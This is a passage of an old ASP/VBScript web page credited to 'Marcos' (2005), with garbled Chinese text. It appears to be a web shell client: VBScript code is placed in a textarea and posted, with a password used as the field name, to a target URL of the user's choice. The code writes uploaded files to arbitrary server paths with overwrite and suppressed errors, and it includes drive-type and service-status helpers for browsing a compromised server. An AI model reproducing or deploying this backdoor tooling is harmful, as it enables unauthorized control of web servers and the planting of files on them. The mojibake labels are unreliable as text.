           echo &quot;&lt;/form>&quot;
       End Sub

       Sub streamUpload(thePath)
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Server.ScriptTimeOut = 5000
           Dim i, j, info, stream, streamT, theFile, fileName, overWrite, fileContent
           theFile = Request(&quot;theFile&quot;)
           fileName = Request(&quot;fileName&quot;)
           overWrite = Request(&quot;overWrite&quot;)
           If InStr(fileName, &quot;:&quot;) &lt;= 0 Then
               fileName = thePath & fileName
           End If
           Set stream = Server.CreateObject(&quot;adodb.stream&quot;)
           Set streamT = Server.CreateObject(&quot;adodb.stream&quot;)
           With stream
               .Type = 1
               .Mode = 3
               .Open
               .Write Request.BinaryRead(Request.TotalBytes)
               .Position = 0
               fileContent = .Read()
               i = InStrB(fileContent, chrB(13) & chrB(10))
               info = LeftB(fileContent, i - 1)
               i = Len(info) + 2
               i = InStrB(i, fileContent, chrB(13) & chrB(10) & chrB(13) & chrB(10)) + 4 - 1
               j = InStrB(i, fileContent, info) - 1
               streamT.Type = 1
               streamT.Mode = 3
               streamT.Open
               stream.position = i
               .CopyTo streamT, j - i - 2
               If overWrite = &quot;true&quot; Then
                   streamT.SaveToFile fileName, 2
                Else
                   streamT.SaveToFile fileName
               End If
               If Err.Number = 3004 Then
                   Err.Clear
                   fileName = fileName & &quot;\&quot; & Split(theFile, &quot;\&quot;)(UBound(Split(theFile ,&quot;\&quot;)))
                   If overWrite=&quot;true&quot; Then
                       streamT.SaveToFile fileName, 2
                    Else
                       streamT.SaveToFile fileName
                   End If
               End If
               chkErr(Err)
               echo(&quot;&lt;script language=&quot;&quot;javascript&quot;&quot;>alert('ÎÄ¼þÉÏ´«³É¹¦!\n&quot; & Replace(fileName, &quot;\&quot;, &quot;\\&quot;) & &quot;');&lt;/script>&quot;)
               streamT.Close
               .Close
           End With

           Set stream = Nothing
           Set streamT = Nothing
       End Sub
       Function getDriveType(num)
           Select Case num
               Case 0
                   getDriveType = &quot;Î´Öª&quot;
               Case 1
                   getDriveType = &quot;¿ÉÒÆ¶¯´ÅÅÌ&quot;
               Case 2
                   getDriveType = &quot;±¾µØÓ²ÅÌ&quot;
               Case 3
                   getDriveType = &quot;ÍøÂç´ÅÅÌ&quot;
               Case 4
                   getDriveType = &quot;CD-ROM&quot;
               Case 5
                   getDriveType = &quot;RAM ´ÅÅÌ&quot;
           End Select
       End Function
       Function getFileIcon(extName)
           Select Case LCase(extName)
               Case &quot;vbs&quot;, &quot;h&quot;, &quot;c&quot;, &quot;cfg&quot;, &quot;pas&quot;, &quot;bas&quot;, &quot;log&quot;, &quot;asp&quot;, &quot;txt&quot;, &quot;php&quot;, &quot;ini&quot;, &quot;inc&quot;, &quot;htm&quot;, &quot;html&quot;, &quot;xml&quot;, &quot;conf&quot;, &quot;config&quot;, &quot;jsp&quot;, &quot;java&quot;, &quot;htt&quot;, &quot;lst&quot;, &quot;aspx&quot;, &quot;php3&quot;, &quot;php4&quot;, &quot;js&quot;, &quot;css&quot;, &quot;asa&quot;
                   getFileIcon = &quot;Wingdings>2&quot;
               Case &quot;wav&quot;, &quot;mp3&quot;, &quot;wma&quot;, &quot;ra&quot;, &quot;wmv&quot;, &quot;ram&quot;, &quot;rm&quot;, &quot;avi&quot;, &quot;mpg&quot;
                   getFileIcon = &quot;Webdings>¡¤&quot;
               Case &quot;jpg&quot;, &quot;bmp&quot;, &quot;png&quot;, &quot;tiff&quot;, &quot;gif&quot;, &quot;pcx&quot;, &quot;tif&quot;
                   getFileIcon = &quot;'webdings'>&#159;&quot;
               Case &quot;exe&quot;, &quot;com&quot;, &quot;bat&quot;, &quot;cmd&quot;, &quot;scr&quot;, &quot;msi&quot;
                   getFileIcon = &quot;Webdings>1&quot;
               Case &quot;sys&quot;, &quot;dll&quot;, &quot;ocx&quot;
                   getFileIcon = &quot;Wingdings>&#255;&quot;
               Case Else
                   getFileIcon = &quot;'Wingdings 2'>/&quot;
           End Select
       End Function
       Function getStartType(num)
           Select Case num
               Case 2
                   getStartType = &quot;×Ô¶¯&quot;
               Case 3
                   getStartType = &quot;ÊÖ¶¯&quot;
               Case 4
                   getStartType = &quot;ÒÑ½ûÓÃ&quot;
           End Select
       End Function
   </textarea></td></tr><tr><td align="center" class="td"> <input type="submit" name="Submit3" value=" Ìá½» " onClick="this.form.sharp.name=this.form.password.value;this.form.action=this.form.theAction.value;"> <input type="reset" name="Submit32" value=" ÖØÖÃ "></td></tr><tr><td class="trHead">&nbsp;</td></tr><tr> <td height="22" align="right" class="td">Powered By <a href="javascript:;" title="QQ:26696782
   http://hididi.net">Marcos</a> 2005.02&nbsp;</td></tr></form></table></body></html>
